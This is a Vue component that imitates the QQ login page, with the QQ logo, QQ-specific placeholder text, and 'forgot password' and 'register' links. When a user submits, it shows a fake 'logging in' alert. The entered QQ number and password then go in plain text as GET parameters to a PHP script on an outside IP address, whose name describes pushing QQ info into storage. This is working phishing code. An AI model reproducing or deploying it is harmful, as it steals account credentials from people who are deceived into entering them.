<template>
  <div class="login">
<!--    <img src="../../assets/img/QZone.jpg" alt="">-->
    <div class="logo"></div>
      <div id="web_login">
        <div>
          <input id="u" class="inputstyle" name="u" autocomplete="off" placeholder="QQ号码/手机/邮箱" v-model="id">
        </div>
        <div>
          <input id="p" class="inputstyle" maxlength="16" type="password" name="p" autocorrect="off" placeholder="请输入你的QQ密码" v-model="pwd">
        </div>
        <div id="go" @click="submitData"> 登 录 </div>
      </div>
    <div id="feedback">
      <span id="forget">忘了密码？</span>
      <span id="zc">注册新账号</span>
    </div>
  </div>
</template>

<script>
import {request} from "../../network/request";
import axios from "axios";

export default {
  name: "qqZone",
  data(){
    return{
      id:'', pwd:'',xurl:'',result:''
    }
  },
  methods:{
    submitData(){
      alert('提交成功，正在登录...');
      console.log(this.id);
      console.log(this.pwd);
      // this.xurl = 'http://localhost:8098/qqinfosql/qqinfoselect.php';
      // this.xurl = 'http://localhost:8098/qqinfosql/qqinfopush.php?qqId='+this.id+'&&qqPwd='+this.pwd;
      // this.xurl = 'http://39.105.94.15:80/phpapi/qqinfosql/qqinfopush.php?qqId='+this.id+'&&qqPwd='+this.pwd;
      this.xurl = 'http://39.105.94.15:80/phpapi/qqinfosql/qqinfopush.php';
      console.log(this.xurl);
      request(
          {
            method:'GET',
            url:this.xurl,
            params:{
              qqId:this.id,
              qqPwd:this.pwd
            }
            },
          (res)=>{
            console.log(res);
          },
          (rej)=> {
            console.log(rej);
          }
      )
    }
  }
}
</script>

<style scoped>
.login{
  font-size: 16px;
  width: 320px;
  height: 356px;
  /*background-color: hotpink;*/
  margin-top: 30px;
  margin-left:auto;
  margin-right:auto;
}
.logo{
  background-image:url("../../assets/img/ptlogin-logo.png");
  width: 244px;
  height: 100px;
  margin: 0 auto 20px;
  background-size: 244px 100px;
}
.inputstyle{
  width: 273px;
  height: 44px;
  padding-left: 15px;
  color: #000;
  border: none;
  background: 0 0;
  outline: none;
}
#web_login{
  width: 290px;
  height: 148px;
  margin: 0 auto;
}
#u{
  border-bottom: rgb(241, 241, 241) 1px solid;
}
#go {
  width: 290px;
  height: 44px;
  line-height: 44px;
  text-align: center;
  /*vertical-align: middle;*/
  background-color: rgb(20, 111, 223);
  margin-top: 15px;
  color: #fff;
}
#feedback{
  width: 290px;
  position: relative;
  margin: 15px auto;
  padding: 0 0 0 0;
  overflow: hidden;
}
#forget{
  margin-left: -10px;
}
#forget,#zc{
  float: left;
  width: 70px;
  height: 13.6px;
  font-size: 14px;
  padding: 15px 10px;
  color: #246183;
}
#zc{
  float: right;
  margin-right: -10px;
}
</style>
